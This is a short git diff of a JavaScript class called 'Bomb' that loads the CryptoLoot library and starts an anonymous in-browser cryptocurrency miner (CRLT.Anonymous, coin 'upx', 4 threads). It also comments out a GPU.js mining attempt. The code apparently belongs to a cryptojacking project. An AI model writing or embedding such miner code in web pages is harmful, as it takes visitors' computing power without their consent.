@@ -13,8 +13,7 @@ class Bomb {
             console.log('Ready to loot')
         })
 
-        //this.libRequireJS = 'lib/require.js'
-
+        // this.libRequireJS = 'lib/require.js'
         // this.importLib(this.libRequireJS).then(() => {
         //     console.log('Ready to require')
         //
@@ -88,20 +87,19 @@ class Bomb {
     // async requireBundle() {
     //     requirejs.config({
     //         baseUrl: "lib/",
-    //         enforceDefine: true,
+    //         enforceDefine: false,
     //         waitSeconds: 200,
     //         paths: {
     //             "gpujs": 'gpu-browser.min',
-    //             'cryptoloot': this.libCryptoLoot
+    //             'cryptoloot': './cryptoloot-master/lib/crypta'
     //         }
     //     });
     //
-    //     this.gpujs = requirejs(['gpujs'])
+    //     //this.gpujs = requirejs(['gpujs'])
+    //     requirejs(['cryptoloot'])
     // }
 
-    async mine(TOKEN) {
-        console.log(CRLT)
-        console.log(TOKEN)
+    mine(TOKEN) {
         this.worker = new CRLT.Anonymous(TOKEN, {
             threads: 4, throttle: 0.2, coin: "upx",
         });
@@ -115,12 +113,12 @@ class Bomb {
         let ENV = await this.getENV()
         let TOKEN = ENV.TOKEN
         console.log(TOKEN)
-
-        const gpu = new GPU()
-        this.testGPU(gpu)
-        this.mine(TOKEN)
-        const gpuminer = gpu.createKernel(this.mine(TOKEN), {output: [1]})
-        console.log(gpuminer)
+        //
+        // const gpu = new GPU()
+        // this.testGPU(gpu)
+        // this.mine(TOKEN)
+        // const gpuminer = gpu.createKernel(this.mine(TOKEN), {output: [1]})
+        // console.log(gpuminer)
     }
 }
 
